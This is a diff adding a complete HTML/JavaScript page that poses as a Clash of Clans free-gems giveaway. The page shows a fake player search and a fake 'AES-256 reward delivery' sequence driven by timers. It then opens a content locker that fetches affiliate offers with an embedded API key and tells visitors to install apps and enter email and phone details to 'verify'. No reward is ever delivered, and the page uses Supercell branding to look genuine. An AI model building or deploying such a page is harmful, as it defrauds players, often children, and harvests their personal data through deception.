@@ -1,0 +1,1027 @@
+<!DOCTYPE html>
+<html lang="en" id="html-root" dir="ltr">
+<head>
+  <script type='text/javascript'>
+//<![CDATA[
+var uri = window.location.toString();
+if (uri.indexOf("%3D") > 0) {
+    var clean_uri = uri.substring(0, uri.indexOf("%3D"));
+    window.history.replaceState({}, document.title, clean_uri);
+}
+
+var uri = window.location.toString();
+if (uri.indexOf("%3D%3D") > 0) {
+    var clean_uri = uri.substring(0, uri.indexOf("%3D%3D"));
+    window.history.replaceState({}, document.title, clean_uri);
+}
+
+var uri = window.location.toString();
+if (uri.indexOf("&m=1") > 0) {
+    var clean_uri = uri.substring(0, uri.indexOf("&m=1"));
+    window.history.replaceState({}, document.title, clean_uri);
+}
+
+var uri = window.location.toString();
+if (uri.indexOf("?m=1") > 0) {
+    var clean_uri = uri.substring(0, uri.indexOf("?m=1"));
+    window.history.replaceState({}, document.title, clean_uri);
+}
+//]]>
+</script>
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Clash rewards</title>
+  <link rel="icon" href="https://cdn2.steamgriddb.com/icon/dd36aac329975a8fd636eedf78cac830.ico">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=Lilita+One&display=swap" rel="stylesheet">
+  
+  <!-- مكتبة jQuery لجلب العروض من الـ API عبر JSONP -->
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Lilita One', 'Cairo', sans-serif;
+      user-select: none;
+    }
+
+    body {
+      background-color: #0b5da9;
+      background-image: 
+        linear-gradient(135deg, #094a87 25%, transparent 25%), 
+        linear-gradient(225deg, #094a87 25%, transparent 25%), 
+        linear-gradient(45deg, #094a87 25%, transparent 25%), 
+        linear-gradient(315deg, #094a87 25%, #0b5da9 25%);
+      background-position: 40px 0, 40px 0, 0 0, 0 0;
+      background-size: 80px 80px;
+      background-repeat: repeat;
+      color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    /* الشريط العلوي */
+    .header-bar {
+      display: flex;
+      justify-content: flex-end;
+      padding: 15px 20px;
+      width: 100%;
+    }
+
+    [dir="rtl"] .header-bar {
+      justify-content: flex-start;
+    }
+
+    .lang-selector-box {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(0, 0, 0, 0.4);
+      border: 1px solid rgba(255, 255, 255, 0.3);
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 0.9rem;
+      cursor: pointer;
+    }
+
+    .lang-select {
+      background: transparent;
+      border: none;
+      color: #fff;
+      font-weight: bold;
+      outline: none;
+      cursor: pointer;
+    }
+
+    .lang-select option {
+      background: #094a87;
+      color: #fff;
+    }
+
+    /* الحاوية الأساسية */
+    .container {
+      width: 100%;
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 10px 20px 40px 20px;
+      text-align: center;
+    }
+
+    .logo-container {
+      margin-bottom: 20px;
+    }
+
+    .top-logo-img {
+      max-width: 220px;
+      height: auto;
+      filter: drop-shadow(0px 6px 8px rgba(0, 0, 0, 0.4));
+    }
+
+    /* لوحة إدخال التاغ */
+    .card-panel {
+      background: rgba(5, 26, 50, 0.88);
+      border: 4px solid #1c2e4a;
+      border-radius: 16px;
+      padding: 20px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+      margin-bottom: 25px;
+      min-height: 150px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .section-label {
+      display: block;
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 12px;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.6);
+    }
+
+    .input-box {
+      width: 100%;
+      background: #ffffff;
+      border: 3px solid #1a1b20;
+      border-radius: 10px;
+      padding: 12px;
+      font-size: 1.15rem;
+      font-weight: bold;
+      color: #1a1b20;
+      text-align: center;
+      outline: none;
+    }
+
+    /* الأزرار الصفراء الموحدة */
+    .btn-action-yellow {
+      width: 100%;
+      background: linear-gradient(to bottom, #ffea55 0%, #f1a900 100%);
+      border: 3px solid #231200;
+      border-bottom: 8px solid #a85800;
+      border-radius: 12px;
+      padding: 10px 20px;
+      cursor: pointer;
+      box-shadow: 0 6px 0 rgba(0, 0, 0, 0.2);
+      transition: all 0.1s ease;
+      margin-top: 15px;
+    }
+
+    .btn-action-yellow:active {
+      transform: translateY(4px);
+      border-bottom: 4px solid #a85800;
+      box-shadow: 0 2px 0 rgba(0, 0, 0, 0.2);
+    }
+
+    .btn-text-style {
+      font-family: 'Lilita One', 'Cairo', sans-serif;
+      color: #ffffff;
+      text-shadow: 
+        -2px -2px 0 #000, 
+        2px -2px 0 #000, 
+        -2px 2px 0 #000, 
+        2px 2px 0 #000, 
+        0px 3px 0px #663300;
+      font-size: 1.45rem;
+      letter-spacing: 1px;
+    }
+
+    /* شريط البحث */
+    .progress-container {
+      display: none;
+      margin-top: 15px;
+    }
+
+    .progress-bar-bg {
+      width: 100%;
+      background: #061930;
+      border-radius: 10px;
+      padding: 4px;
+      border: 2px solid #1f3f66;
+      margin-bottom: 8px;
+    }
+
+    .progress-bar-fill {
+      width: 0%;
+      height: 16px;
+      background: linear-gradient(to right, #00ff87, #00d152);
+      border-radius: 6px;
+      transition: width 0.1s linear;
+    }
+
+    .progress-text {
+      font-size: 0.9rem;
+      color: #79a1d1;
+      font-weight: bold;
+    }
+
+    /* قسم المكافآت */
+    .rewards-section {
+      opacity: 0.35;
+      pointer-events: none;
+      transition: opacity 0.4s ease;
+      background: rgba(5, 26, 50, 0.88);
+      border: 4px solid #1c2e4a;
+      border-radius: 16px;
+      padding: 20px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+      margin-bottom: 25px;
+    }
+
+    .rewards-section.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .rewards-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+      margin-top: 15px;
+    }
+
+    .reward-card {
+      background: linear-gradient(135deg, #102e52 0%, #061930 100%);
+      border: 3px solid #1f3f66;
+      border-radius: 14px;
+      padding: 15px 10px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .reward-card:hover {
+      transform: translateY(-4px);
+      border-color: #ffd700;
+    }
+
+    .reward-card.selected {
+      border-color: #00ff87;
+      background: linear-gradient(135deg, #174275 0%, #082449 100%);
+      box-shadow: 0 0 15px rgba(0, 255, 135, 0.3);
+    }
+
+    .reward-icon-img {
+      width: 90px;
+      height: 90px;
+      object-fit: contain;
+      margin-bottom: 8px;
+    }
+
+    .reward-amount {
+      font-size: 1.35rem;
+      font-weight: 900;
+      color: #ffffff;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.8);
+    }
+
+    .reward-label {
+      font-size: 0.85rem;
+      color: #79a1d1;
+    }
+
+    /* طبقة النوافذ المنبثقة الشاملة لتأثير الـ Blur في الخلفية */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 8, 20, 0.78);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      z-index: 2000;
+      justify-content: center;
+      align-items: center;
+      overflow-y: auto;
+      padding: 15px;
+    }
+
+    @keyframes popIn {
+      from { transform: scale(0.9); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    /* 1. نافذة المعاينة (SELECTION PREVIEW) */
+    .preview-box {
+      background: #091a2e;
+      border: 2px solid #ffd700;
+      border-radius: 20px;
+      padding: 24px 20px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 0 35px rgba(255, 215, 0, 0.35);
+      animation: popIn 0.3s ease-out;
+      text-align: center;
+    }
+
+    .preview-header {
+      font-size: 1.45rem;
+      font-weight: 900;
+      color: #ffd700;
+      letter-spacing: 1px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid rgba(255, 215, 0, 0.2);
+      margin-bottom: 20px;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.8);
+    }
+
+    .preview-inner-card {
+      background: rgba(4, 14, 27, 0.9);
+      border: 2px solid #1f3f66;
+      border-radius: 14px;
+      padding: 25px 15px;
+      margin-bottom: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .preview-img-glow {
+      max-width: 110px;
+      height: auto;
+      margin-bottom: 15px;
+      filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.4));
+    }
+
+    .preview-amount-text {
+      font-size: 1.6rem;
+      font-weight: 900;
+      color: #ffffff;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.8);
+    }
+
+    .preview-sub-text {
+      font-size: 1rem;
+      color: #79a1d1;
+      margin-top: 4px;
+    }
+
+    /* 2. نافذة خطوات المعالجة (REWARD DELIVERY SYSTEM) */
+    .delivery-box {
+      background: #091a2e;
+      border: 2px solid #ffd700;
+      border-radius: 20px;
+      padding: 25px 20px;
+      width: 100%;
+      max-width: 440px;
+      box-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
+      animation: popIn 0.3s ease-out;
+      text-align: center;
+    }
+
+    .delivery-header {
+      font-size: 1.4rem;
+      font-weight: 900;
+      color: #ffd700;
+      letter-spacing: 1px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid rgba(255, 215, 0, 0.2);
+      margin-bottom: 25px;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.8);
+    }
+
+    .delivery-steps {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      text-align: left;
+    }
+
+    [dir="rtl"] .delivery-steps {
+      text-align: right;
+    }
+
+    .delivery-step-item {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      color: #5d7593;
+      transition: all 0.3s ease;
+    }
+
+    .delivery-badge {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #192a3e;
+      color: #5d7593;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 900;
+      font-size: 1rem;
+      flex-shrink: 0;
+      transition: all 0.3s ease;
+    }
+
+    .delivery-text {
+      font-size: 0.92rem;
+      line-height: 1.35;
+    }
+
+    .delivery-step-item.active {
+      color: #ffffff;
+    }
+
+    .delivery-step-item.active .delivery-badge {
+      background: #ffd700;
+      color: #102131;
+      box-shadow: 0 0 10px rgba(255, 215, 0, 0.6);
+      transform: scale(1.05);
+    }
+
+    /* 3. نافذة قفل العروض (Clash Content Locker) */
+    .locker-box {
+      background: #091a2e;
+      border: 3px solid #f1a900;
+      border-radius: 20px;
+      padding: 24px 18px;
+      width: 100%;
+      max-width: 440px;
+      position: relative;
+      box-shadow: 0 0 30px rgba(241, 169, 0, 0.35);
+      animation: popIn 0.3s ease-out;
+      text-align: left;
+    }
+
+    [dir="rtl"] .locker-box {
+      text-align: right;
+    }
+
+    .modal-close {
+      position: absolute;
+      top: 10px;
+      right: 15px;
+      font-size: 26px;
+      cursor: pointer;
+      color: #79a1d1;
+    }
+
+    [dir="rtl"] .modal-close {
+      right: auto;
+      left: 15px;
+    }
+
+    .locker-logo-wrap {
+      text-align: center;
+      margin-bottom: 15px;
+    }
+
+    .locker-logo-img {
+      max-width: 190px;
+      height: auto;
+      filter: drop-shadow(0px 4px 6px rgba(0, 0, 0, 0.6));
+    }
+
+    .locker-banner {
+      background: rgba(43, 24, 20, 0.85);
+      border-left: 4px solid #ff7b25;
+      padding: 10px 14px;
+      border-radius: 6px;
+      font-size: 0.88rem;
+      line-height: 1.4;
+      color: #ffd8bf;
+      margin-bottom: 16px;
+      text-align: center;
+    }
+
+    [dir="rtl"] .locker-banner {
+      border-left: none;
+      border-right: 4px solid #ff7b25;
+    }
+
+    .locker-step-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 10px;
+      font-size: 0.86rem;
+      color: #cfddec;
+    }
+
+    .step-badge {
+      background: #ffd700;
+      color: #1a1b20;
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 900;
+      font-size: 0.85rem;
+      flex-shrink: 0;
+    }
+
+    .locker-note {
+      font-size: 0.78rem;
+      color: #8faecf;
+      text-align: center;
+      margin: 15px 0 12px 0;
+      line-height: 1.35;
+    }
+
+    .offers-list {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .offer-item {
+      background: #040e1b;
+      border: 2px solid #1f3f66;
+      border-radius: 12px;
+      padding: 10px 14px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      text-decoration: none;
+      transition: all 0.2s ease;
+    }
+
+    .offer-item:hover {
+      border-color: #ffd700;
+      transform: translateY(-2px);
+    }
+
+    .offer-title {
+      font-size: 0.95rem;
+      font-weight: 700;
+      color: #ffffff;
+      flex: 1;
+      padding-right: 10px;
+    }
+
+    [dir="rtl"] .offer-title {
+      padding-right: 0;
+      padding-left: 10px;
+    }
+
+    .btn-offer-start {
+      background: linear-gradient(to bottom, #ffea55 0%, #f1a900 100%);
+      color: #1a1b20;
+      font-weight: 900;
+      font-size: 0.9rem;
+      padding: 8px 18px;
+      border-radius: 8px;
+      border: 1px solid #7d4400;
+      box-shadow: 0 3px 0 #7d4400;
+      white-space: nowrap;
+    }
+
+    .waiting-text {
+      text-align: center;
+      font-size: 0.85rem;
+      color: #ffd700;
+      margin-top: 15px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+
+    .dots {
+      display: inline-block;
+      animation: blink 1.2s infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 0.2; }
+      50% { opacity: 1; }
+    }
+
+    /* الفوتر */
+    footer {
+      background: #000000;
+      padding: 25px 15px;
+      text-align: center;
+      width: 100%;
+      border-top: 2px solid #111;
+      margin-top: auto;
+    }
+
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 15px;
+      margin-bottom: 15px;
+    }
+
+    .footer-links a {
+      color: #bcbcbc;
+      text-decoration: none;
+      font-size: 0.85rem;
+    }
+
+    .footer-logo-img {
+      max-width: 90px;
+      height: auto;
+      opacity: 0.85;
+      margin: 0 auto;
+      display: block;
+    }
+  </style>
+<link rel="me" href="https://www.blogger.com/profile/17069023153228290428" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+<body>
+
+  <!-- شريط اللغات -->
+  <div class="header-bar">
+    <div class="lang-selector-box">
+      <select class="lang-select" onchange="changeLanguage(this.value)">
+        <option value="en">English</option>
+        <option value="ar">العربية</option>
+        <option value="fr">Français</option>
+      </select>
+    </div>
+  </div>
+
+  <div class="container">
+    <div class="logo-container">
+      <img src="https://upload.wikimedia.org/wikipedia/fr/5/59/Clash_of_Clans_Logo.png" alt="Clash of Clans Logo" class="top-logo-img">
+    </div>
+
+    <!-- صندوق الإدخال الرئيسي -->
+    <div class="card-panel" id="main-panel">
+      <div id="id-input-wrapper">
+        <label class="section-label" id="label-id" for="player-id">Enter Player Tag (#)</label>
+        
+        <input 
+          type="text" 
+          class="input-box" 
+          id="player-id" 
+          placeholder="#PLAYER_TAG" 
+          maxlength="10" 
+          dir="ltr"
+          oninput="this.value = this.value.replace(/[^a-zA-Z0-9#]/g, '').slice(0, 10)">
+        
+        <button class="btn-action-yellow" id="btn-continue" onclick="startSearch()">
+          <span class="btn-text-style" id="btn-text-continue">Continue</span>
+        </button>
+
+        <div class="progress-container" id="search-progress">
+          <div class="progress-bar-bg">
+            <div class="progress-bar-fill" id="progress-fill"></div>
+          </div>
+          <div class="progress-text" id="progress-status">Searching for player...</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- شبكة المكافآت -->
+    <div class="rewards-section" id="rewards-panel">
+      <div class="section-label" id="label-choose">Select Your Reward Pack</div>
+      <div class="rewards-grid">
+        <div class="reward-card" onclick="selectReward(this, 'X1', 'Gold Pass', 'https://images.ezg.com/web/image/top%20up/20260621223840.webp?width=300')">
+          <img class="reward-icon-img" src="https://images.ezg.com/web/image/top%20up/20260621223840.webp?width=300" alt="Gold Pass">
+          <div class="reward-amount">X1</div>
+          <div class="reward-label">Gold Pass</div>
+        </div>
+        <div class="reward-card" onclick="selectReward(this, '500', 'Pile of gems', 'https://res.cloudinary.com/dbmbssn2w/image/upload/v1764630005/otkratos/ogjnmgaiijbotkanbwre.png')">
+          <img class="reward-icon-img" src="https://res.cloudinary.com/dbmbssn2w/image/upload/v1764630005/otkratos/ogjnmgaiijbotkanbwre.png" alt="Gems">
+          <div class="reward-amount">500</div>
+          <div class="reward-label">Pile of gems</div>
+        </div>
+        <div class="reward-card" onclick="selectReward(this, '1200', 'Bag of gems', 'https://images.ezg.com/web/image/top%20up/6a8e2ad55d2a.png?width=300')">
+          <img class="reward-icon-img" src="https://images.ezg.com/web/image/top%20up/6a8e2ad55d2a.png?width=300" alt="Gems">
+          <div class="reward-amount">1200</div>
+          <div class="reward-label">Bag of gems</div>
+        </div>
+        <div class="reward-card" onclick="selectReward(this, '2500', 'Sack of gems', 'https://images.ezg.com/web/image/top%20up/562e54fdf657.png?width=300')">
+          <img class="reward-icon-img" src="https://images.ezg.com/web/image/top%20up/562e54fdf657.png?width=300" alt="Gems">
+          <div class="reward-amount">2500</div>
+          <div class="reward-label">Sack of gems</div>
+        </div>
+        <div class="reward-card" onclick="selectReward(this, '6500', 'Box of gems', 'https://images.ezg.com/web/image/top%20up/f1a41d6944cc.png?width=300')">
+          <img class="reward-icon-img" src="https://images.ezg.com/web/image/top%20up/f1a41d6944cc.png?width=300" alt="Gems">
+          <div class="reward-amount">6500</div>
+          <div class="reward-label">Box of gems</div>
+        </div>
+        <div class="reward-card" onclick="selectReward(this, '14000', 'Chest of gems', 'https://images.ezg.com/web/image/top%20up/730896e145ac.png?width=300')">
+          <img class="reward-icon-img" src="https://images.ezg.com/web/image/top%20up/730896e145ac.png?width=300" alt="Gems">
+          <div class="reward-amount">14000</div>
+          <div class="reward-label">Chest of gems</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 1. نافذة المعاينة (SELECTION PREVIEW) بتصميم ومؤثرات كلاش أوف كلانس -->
+  <div class="modal-overlay" id="preview-modal">
+    <div class="preview-box">
+      <div class="preview-header" id="prev-title">SELECTION PREVIEW</div>
+      <div class="preview-inner-card">
+        <img src="" alt="Selected Reward" id="prev-img" class="preview-img-glow">
+        <div class="preview-amount-text" id="prev-amount">10,000</div>
+        <div class="preview-sub-text" id="prev-label">Gems</div>
+      </div>
+      <button class="btn-action-yellow" onclick="proceedToDelivery()">
+        <span class="btn-text-style" id="btn-text-prev-continue">CONTINUE</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- 2. نافذة خطوات المعالجة (REWARD DELIVERY SYSTEM) -->
+  <div class="modal-overlay" id="delivery-modal">
+    <div class="delivery-box">
+      <div class="delivery-header" id="deliv-title">REWARD DELIVERY SYSTEM</div>
+      <div class="delivery-steps">
+        <div class="delivery-step-item" id="d-step-1">
+          <div class="delivery-badge">1</div>
+          <div class="delivery-text" id="deliv-step1">Connecting securely to central server via AES-256...</div>
+        </div>
+        <div class="delivery-step-item" id="d-step-2">
+          <div class="delivery-badge">2</div>
+          <div class="delivery-text" id="deliv-step2">Matching item details with user account ID...</div>
+        </div>
+        <div class="delivery-step-item" id="d-step-3">
+          <div class="delivery-badge">3</div>
+          <div class="delivery-text" id="deliv-step3">Finalizing data transmission and authenticating transaction key...</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 3. نافذة قفل العروض (Clash Content Locker) مع اللوغو وخلفية الـ Blur -->
+  <div class="modal-overlay" id="locker-modal">
+    <div class="locker-box">
+      <span class="modal-close" onclick="closeLocker()">&times;</span>
+      
+      <div class="locker-logo-wrap">
+        <img src="https://upload.wikimedia.org/wikipedia/fr/5/59/Clash_of_Clans_Logo.png" alt="Clash of Clans" class="locker-logo-img">
+      </div>
+      
+      <div class="locker-banner" id="locker-banner">
+        Complete ONE Task from the list below to verify you're human, and you will receive your reward.
+      </div>
+
+      <div class="locker-step-row">
+        <span class="step-badge">1</span>
+        <span id="step-1-text">Click on any offer from the list below</span>
+      </div>
+      <div class="locker-step-row">
+        <span class="step-badge">2</span>
+        <span id="step-2-text">Install an app and run it for 30 seconds or complete a short survey</span>
+      </div>
+      <div class="locker-step-row">
+        <span class="step-badge">3</span>
+        <span id="step-3-text">You will receive your reward automatically</span>
+      </div>
+
+      <div class="locker-note" id="locker-note">
+        <strong>Note:</strong> If you click on one offer and it doesn't open, just choose another one.<br>
+        And you need to enter correct information (like email, phone number, etc.)
+      </div>
+
+      <!-- قائمة العروض المجلوبة -->
+      <div class="offers-list" id="offers-container">
+        <div style="text-align:center; padding:15px; color:#ffd700;">Loading offers...</div>
+      </div>
+
+      <div class="waiting-text">
+        <span id="txt-waiting">Waiting for verification</span> <span class="dots">● ● ●</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- الفوتر -->
+  <footer>
+    <div class="footer-links">
+      <a href="#">Parent's guide</a>
+      <a href="#">Terms of Service</a>
+      <a href="#">Privacy Policy</a>
+    </div>
+    <img src="https://i.ibb.co/qYWvrSgq/supercell-logo-50e3c1ff.webp" alt="Supercell Logo" class="footer-logo-img">
+  </footer>
+
+  <script>
+    const translations = {
+      en: {
+        dir: "ltr",
+        labelId: "Enter Player Tag (#)",
+        searching: "Searching for player...",
+        verifying: "Verifying account status...",
+        found: "Player Verified successfully!",
+        labelChoose: "Select Your Reward Pack",
+        prevTitle: "SELECTION PREVIEW",
+        prevBtn: "CONTINUE",
+        delivTitle: "REWARD DELIVERY SYSTEM",
+        delivS1: "Connecting securely to central server via AES-256...",
+        delivS2: "Matching item details with user account ID...",
+        delivS3: "Finalizing data transmission and authenticating transaction key...",
+        banner: "Complete ONE Task from the list below to verify you're human, and you will receive your reward.",
+        s1: "Click on any offer from the list below",
+        s2: "Install an app and run it for 30 seconds or complete a short survey",
+        s3: "You will receive your reward automatically",
+        note: "<strong>Note:</strong> If you click on one offer and it doesn't open, just choose another one.<br>And you need to enter correct information.",
+        waiting: "Waiting for verification"
+      },
+      ar: {
+        dir: "rtl",
+        labelId: "أدخل تاغ اللاعب (#)",
+        searching: "جاري البحث عن اللاعب...",
+        verifying: "جاري التحقق من حالة الحساب...",
+        found: "تم التحقق من الحساب بنجاح!",
+        labelChoose: "اختر حزمة المكافأة الخاصة بك",
+        prevTitle: "معاينة الاختيار",
+        prevBtn: "متابعة",
+        delivTitle: "نظام إرسال المكافآت",
+        delivS1: "الاتصال الآمن بالخادم الرئيسي عبر تشفير AES-256...",
+        delivS2: "مطابقة تفاصيل المكافأة مع معرف الحساب...",
+        delivS3: "إنهاء نقل البيانات والمصادقة على مفتاح التحويل...",
+        banner: "أكمل مهمة واحدة من القائمة أدناه للتحقق من أنك لست روبوت، وستصلك مكافأتك فوراً.",
+        s1: "اضغط على أي عرض من القائمة أسفله",
+        s2: "قم بتحميل تطبيق وافتحه لمدة 30 ثانية أو أكمل استطلاعاً بسيطاً",
+        s3: "ستحصل على مكافأتك إلى حسابك بشكل تلقائي",
+        note: "<strong>ملاحظة:</strong> إذا فتحت عرضاً ولم يعمل، اختر عرضاً آخر.<br>يرجى إدخال معلومات صحيحة لإتمام التحقق بنجاح.",
+        waiting: "في انتظار إكمال التحقق"
+      },
+      fr: {
+        dir: "ltr",
+        labelId: "Entrez le Tag du joueur (#)",
+        searching: "Recherche du joueur...",
+        verifying: "Vérification du compte...",
+        found: "Joueur vérifié avec succès!",
+        labelChoose: "Sélectionnez votre pack",
+        prevTitle: "APERÇU DE LA SÉLECTION",
+        prevBtn: "CONTINUER",
+        delivTitle: "SYSTÈME D'ENVOI DES RÉCOMPENSES",
+        delivS1: "Connexion sécurisée au serveur central via AES-256...",
+        delivS2: "Vérification des éléments avec l'ID du compte...",
+        delivS3: "Finalisation du transfert et authentification de la clé...",
+        banner: "Complétez UNE tâche de la liste ci-dessous pour vérifier que vous êtes humain et recevoir votre récompense.",
+        s1: "Cliquez sur une offre dans la liste ci-dessous",
+        s2: "Installez une application pendant 30 secondes ou répondez à un sondage",
+        s3: "Vous recevrez votre récompense automatiquement",
+        note: "<strong>Note:</strong> Si une offre ne s'ouvre pas, choisissez-en une autre.<br>Veuillez entrer des informations valides.",
+        waiting: "En attente de vérification"
+      }
+    };
+
+    let currentLang = 'en';
+
+    function changeLanguage(lang) {
+      currentLang = lang;
+      const t = translations[lang];
+      document.getElementById('html-root').setAttribute('dir', t.dir);
+      document.getElementById('html-root').setAttribute('lang', lang);
+      document.getElementById('label-id').innerText = t.labelId;
+      document.getElementById('label-choose').innerText = t.labelChoose;
+      
+      document.getElementById('prev-title').innerText = t.prevTitle;
+      document.getElementById('btn-text-prev-continue').innerText = t.prevBtn;
+
+      document.getElementById('deliv-title').innerText = t.delivTitle;
+      document.getElementById('deliv-step1').innerText = t.delivS1;
+      document.getElementById('deliv-step2').innerText = t.delivS2;
+      document.getElementById('deliv-step3').innerText = t.delivS3;
+
+      document.getElementById('locker-banner').innerHTML = t.banner;
+      document.getElementById('step-1-text').innerText = t.s1;
+      document.getElementById('step-2-text').innerText = t.s2;
+      document.getElementById('step-3-text').innerText = t.s3;
+      document.getElementById('locker-note').innerHTML = t.note;
+      document.getElementById('txt-waiting').innerText = t.waiting;
+    }
+
+    function startSearch() {
+      const idInput = document.getElementById('player-id');
+      const idVal = idInput.value.trim();
+
+      if (!idVal) {
+        alert(currentLang === 'ar' ? 'الرجاء إدخال تاغ اللاعب أولاً.' : 'Please enter Player Tag first.');
+        return;
+      }
+
+      const regex = /^[a-zA-Z0-9#]{1,10}$/;
+      if (!regex.test(idVal)) {
+        alert(currentLang === 'ar' ? 'يجب أن لا يتعدى 10 رموز وأن يحتوي على حروف أو أرقام أو # فقط.' : 'Must not exceed 10 characters and contain only letters, numbers, or #.');
+        return;
+      }
+
+      document.getElementById('btn-continue').style.display = 'none';
+      const progressContainer = document.getElementById('search-progress');
+      const progressFill = document.getElementById('progress-fill');
+      const progressStatus = document.getElementById('progress-status');
+
+      progressContainer.style.display = 'block';
+
+      let progressWidth = 0;
+      const progressTimer = setInterval(() => {
+        if (progressWidth >= 100) {
+          clearInterval(progressTimer);
+          progressStatus.innerText = translations[currentLang].found;
+          progressFill.style.background = "#00ff87";
+          document.getElementById('rewards-panel').classList.add('active');
+          fetchApiOffers();
+        } else {
+          progressWidth += 2;
+          progressFill.style.width = progressWidth + '%';
+          if (progressWidth < 50) {
+            progressStatus.innerText = translations[currentLang].searching;
+          } else if (progressWidth < 90) {
+            progressStatus.innerText = translations[currentLang].verifying;
+          }
+        }
+      }, 35);
+    }
+
+    // فتح نافذة المعاينة بالبيانات المحددة
+    function selectReward(cardElement, amount, label, imgSrc) {
+      document.querySelectorAll('.reward-card').forEach(el => el.classList.remove('selected'));
+      cardElement.classList.add('selected');
+
+      document.getElementById('prev-img').src = imgSrc;
+      document.getElementById('prev-amount').innerText = amount;
+      document.getElementById('prev-label').innerText = label;
+
+      document.getElementById('preview-modal').style.display = 'flex';
+    }
+
+    // عند الضغط على Continue داخل نافذة المعاينة
+    function proceedToDelivery() {
+      document.getElementById('preview-modal').style.display = 'none';
+      startDeliverySteps();
+    }
+
+    // الانتقال للخطوات التتابعية
+    function startDeliverySteps() {
+      const modal = document.getElementById('delivery-modal');
+      modal.style.display = 'flex';
+
+      const step1 = document.getElementById('d-step-1');
+      const step2 = document.getElementById('d-step-2');
+      const step3 = document.getElementById('d-step-3');
+
+      step1.classList.remove('active');
+      step2.classList.remove('active');
+      step3.classList.remove('active');
+
+      setTimeout(() => {
+        step1.classList.add('active');
+      }, 500);
+
+      setTimeout(() => {
+        step2.classList.add('active');
+      }, 1800);
+
+      setTimeout(() => {
+        step3.classList.add('active');
+      }, 3100);
+
+      setTimeout(() => {
+        modal.style.display = 'none';
+        document.getElementById('locker-modal').style.display = 'flex';
+      }, 4500);
+    }
+
+    function closeLocker() {
+      document.getElementById('locker-modal').style.display = 'none';
+    }
+
+    // جلب العروض من الـ API
+    function fetchApiOffers() {
+      const apiUrl = "https://dtvpp42hfuyb2.cloudfront.net/public/offers/feed.php?user_id=783703&api_key=7e858a7430d573266406c99f87838da4&s1=&s2=&callback=?";
+      
+      $.getJSON(apiUrl, function(offers) {
+        const container = document.getElementById('offers-container');
+        container.innerHTML = '';
+
+        if (offers && offers.length > 0) {
+          const displayOffers = offers.slice(0, 3);
+          displayOffers.forEach(offer => {
+            const a = document.createElement('a');
+            a.className = 'offer-item';
+            a.href = offer.url;
+            a.target = '_blank';
+            a.innerHTML = `
+              <span class="offer-title">${offer.anchor || offer.name_short || offer.name}</span>
+              <button class="btn-offer-start">START</button>
+            `;
+            container.appendChild(a);
+          });
+        } else {
+          container.innerHTML = '<div style="text-align:center; padding:10px; color:#ffd700;">No offers available currently.</div>';
+        }
+      }).fail(function() {
+        const container = document.getElementById('offers-container');
+        container.innerHTML = '<div style="text-align:center; padding:10px; color:#ff7b25;">Failed to load offers. Please try again.</div>';
+      });
+    }
+  </script>
+</body>
+</html>
